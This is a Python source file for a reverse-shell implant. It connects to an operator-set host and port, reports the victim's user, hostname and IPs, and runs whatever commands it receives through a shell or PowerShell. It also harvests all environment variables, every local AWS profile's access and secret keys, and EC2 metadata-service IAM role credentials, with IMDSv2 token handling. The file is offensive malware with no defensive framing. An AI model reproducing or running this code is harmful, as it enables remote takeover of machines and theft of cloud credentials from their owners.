import os
import socket, boto3
import sys
import subprocess
import platform
import requests
import psutil
import json
from multiprocessing import Process
import time
from subprocess import PIPE, Popen





global stop_thread

particles = {}

def init_info(system):
    if system == 'Linux':
        check_env = {}
        check_env["SYSTEM"] = system

        user = os.environ.get('USER')
        check_env['USER'] = user

        uname = os.uname()
        un = {}
        un['sysname'] = uname.sysname
        un['nodename'] = uname.nodename
        un['release'] = uname.release
        un['version'] = uname.version
        un['arch'] = uname.machine

        uname = json.dumps(un)
        check_env['UNAME'] = uname

        env = os.environ
        env_dict = {}
        for key, value in env.items():
            env_dict[key] = value
        check_env["ENV"] = env_dict

        proc = psutil.Process(1).name()
        check_env['INIT'] = proc

        if os.path.exists('/var/run/docker.sock'):
            docksock = True

        else:
            docksock = False

        check_env['DOCKSOCK'] = docksock

        hostname = platform.node()
        check_env['HOSTNAME'] = hostname

        all_sessions = []
        sessions = boto3.session.Session()
        available_sessions = sessions.available_profiles
        if len(available_sessions) > 0:
            for prof_name in available_sessions:
                sess = boto3.session.Session(profile_name=prof_name)
                credentials = sess.get_credentials().get_frozen_credentials()
                awssess = {}
                awssess['profile'] = prof_name
                awssess['AWS_KEY'] = credentials.access_key
                awssess['SECRET_KEY'] = credentials.secret_key
                awssess['region'] = sess.region_name
                all_sessions.append(awssess)

        check_env['AWS_CREDS'] = all_sessions
        return check_env

def meta_data():
    metadata = {}
    metatest = {
        "user-data":"user-data",
        "ami-id":"meta-data/ami-id",
        "instance-id":"meta-data/instance-id",
        "instance-type":"meta-data/instance-type",
        "local-ipv4":"meta-data/local-ipv4",
        "local-hostname": "meta-data/local-hostname",
        "public-ipv4":"meta-data/public-ipv4",
        "public-hostname": "meta-data/public-hostname",
        "security-groups":"meta-data/security-groups",
        "reservation-id":"meta-data/reservation-id",
    }

    iam_metatest = {
        "iam-info": "meta-data/iam/info",
        "ec2-role": "meta-data/iam/security-credentials/",
    }

    adv_metatest = {
        "macs": "network/interfaces/macs",
        "interfaces": []
    }

    interfaces = {
        "interface-id":"interface-id",
        "local-hostname":"local-hostname",
        "local-ipv4s":"local-hostname",
        "public-hostname": "public-hostname",
        "public-ipv4s": "public-hostname",
        "security-groups": "security-groups",
        "security-group-ids": "security-group-ids",
        "subnet-ipv4-cidr-block": "subnet-ipv4-cidr-block",
        "vpc-id": "vpc-id",
        "vpc-ipv4-cidr-block": "vpc-ipv4-cidr-block",
        "vpc-ipv4-cidr-blocks": "vpc-ipv4-cidr-blocks",
    }

    metalink = "http://169.254.169.254/latest/"

    try:
        r = requests.get(metalink, timeout=5)

        if r.status_code == 200:
            metadata["status-code"] = r.status_code
            for key,value in metatest.items():
                meta_resp = requests.get("{}{}".format(metalink,value))
                metadata[key] = meta_resp.text

            iam_info = requests.get("{}{}".format(metalink, iam_metatest['iam-info'])).json()
            iam_arn = iam_info['InstanceProfileArn']
            ec2_role = requests.get("{}{}".format(metalink, iam_metatest['ec2-role'])).text
            iam_keys = requests.get("{}{}".format(metalink, iam_metatest['ec2-role'], ec2_role.text)).json()
            iam_keys['InstanceProfileArn'] = iam_arn

            metadata['iam'] = iam_keys

            ifs = {}
            metalink = metalink + "meta-data" + adv_metatest['macs']
            macs = requests.get("{}{}".format(metalink, adv_metatest['macs'])).json()
            for mac in macs:
                for key, value in interfaces.items():
                    meta_resp = requests.get("{}{}{}".format(metalink, mac, value))
                    ifs[mac] = meta_resp.text

            metadata['interfaces'] = ifs


        elif r.status_code == 401:

            try:
                headers = {"X-aws-ec2-metadata-token-ttl-seconds": '21600'}
                test_token = requests.put("http://169.254.169.254/latest/api/token", headers=headers, timeout=5)
                TOKEN = test_token.text
                # TOKEN= `curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
                # && curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
                metadata["status-code"] = 200
                headers = {"X-aws-ec2-metadata-token": TOKEN}
                metadata["status-code"] = test_token.status_code
                for key, value in metatest.items():
                    meta_resp = requests.get("{}{}".format(metalink, value), headers=headers, timeout=5)
                    # meta_resp = requests.get("http://169.254.169.254/latest/meta-data/mac", headers=headers, timeout=5)
                    if meta_resp.status_code == 200:
                        metadata[key] = meta_resp.text
                    else:
                        metadata[key] = None
                iam_in = requests.get("{}{}".format(metalink, iam_metatest['iam-info']), headers=headers, timeout=5)
                if iam_in.status_code == 200:
                    iam_info = json.loads(iam_in.text)
                    iam_arn = iam_info['InstanceProfileArn']
                    ec2_role = requests.get("{}{}".format(metalink, iam_metatest['ec2-role']), headers=headers,
                                            timeout=5).text
                    iam_k = requests.get("{}{}".format(metalink, iam_metatest['ec2-role'], ec2_role.text),
                                         headers=headers, timeout=5).text
                    iam_keys = json.loads(iam_k)
                    iam_keys['InstanceProfileArn'] = iam_arn
                    metadata['iam'] = iam_keys

                else:
                    metadata['iam'] = None
                ifs = {}
                metalink = metalink + "meta-data" + adv_metatest['macs']
                themacs = requests.get("{}{}".format(metalink, adv_metatest['macs']), headers=headers, timeout=5)

                if themacs.status_code == 200:
                    macs = json.loads(themacs.text)
                    for mac in macs:
                        for key, value in interfaces.items():
                            meta_resp = requests.get("{}{}{}".format(metalink, mac, value), headers=headers, timeout=5)
                            ifs[mac] = meta_resp.text
                    metadata['interfaces'] = ifs

                else:
                    metadata['interfaces'] = None

            except requests.exceptions.ConnectTimeout:
                metadata['status-code'] = 404

        else:
            metadata["status-code"] = r.status_code
    except requests.exceptions.ConnectTimeout:
        metadata['status-code'] = 404

    return metadata

def socket_create():
    global stop_thread
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))

        system = platform.system()

        if system == 'Linux' or system == 'Darwin':
            user = "{}".format(os.environ.get('USER'))

        elif system == 'Windows':
            user = "{}\\{}".format(os.environ.get('USERDOMAIN'), os.environ.get('USERNAME'))

        ip = ''
        ips = []
        ipss = []
        if system == 'Linux':
            hostname = os.environ.get('NAME')
            ip = os.popen('ip a').read()
            for x in ip.split("\n"):
                if "inet" in x:
                    if "127.0.0.1" in x or "::1" in x:
                        continue
                    else:
                        ips.append(x.split(" ")[5])
                        ips = ip.split("\n")
                        for x in ips:
                            if "IPv4 Address" in x:
                                a = ips.index(x)
                                ipss.append(x.split(":")[1] + "\t" + (ips[a + 1]).split(":")[1])

        elif system == 'Windows':
            hostname = os.environ.get('COMPUTERNAME')
            ip = os.popen('ipconfig').read()

        info = {}
        info['USER'] = user
        info['SYSTEM'] = system
        info['HOSTNAME'] = hostname
        info['LAN_IP'] = ipss

        dt = json.dumps(info)
        s.send(dt.encode())

        while True:
            data = s.recv(2048)
            if data.decode().strip() == 'quit' or data.decode().strip() == 'exit':
                stop_thread = False
                s.send('Ok'.encode())
                s.close()
                sys.exit()

            elif len(data.decode()) == 0:
                s.send(" ".encode())

            elif data.decode().strip() == 'check_env':
                check_env_data = init_info(system)
                metadata = meta_data()
                check_env_data['META-DATA'] = metadata
                check_env_data_str = json.dumps(check_env_data)
                s.send(check_env_data_str.encode())

            elif data.decode() == "":
                dt = ' '
                s.send(dt.encode())

            elif 'cd ' in data.decode():
                os.chdir((data.decode())[1:])

            elif (data.decode().strip()).split(" ")[0] == 'kill':
                if len((data.decode().strip()).split(" ")) == 1:
                    s.send("kill_error".encode())
                else:
                    Popen("kill " + (data.decode().strip()).split(" ")[1], shell=True, stdout=PIPE, stderr=PIPE)
                    s.send("killed_{}".format((data.decode().strip()).split(" ")[1]).encode())

            elif data.decode() == ' ':
                dt = ' '
                s.send(dt.encode())
            else:
                out = err = ""
                if system == 'Windows':
                    command = "powershell.exe " + data.decode()
                    p = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
                    out, err = p.communicate()
                elif system == 'Linux' or system == 'Darwin':
                    p = Popen(data.decode(), shell=True, stdout=PIPE, stderr=PIPE)
                    out, err = p.communicate()

                if out.decode() == '':
                    cout = err.decode()
                else:
                    cout = out.decode()
                s.send(cout.encode())
    except socket.error as e:
        pass

def threads():
    global stop_thread
    stop_thread = True
    th = []
    while True:
        thread = Process(target=socket_create)
        th.append(thread)
        thread.start()
        if not stop_thread:
            break
        time.sleep(SECONDS)

    for thread in th:
        thread.terminate()
        thread.join()

if isinstance(SECONDS, int):
    threads()
else:
    socket_create()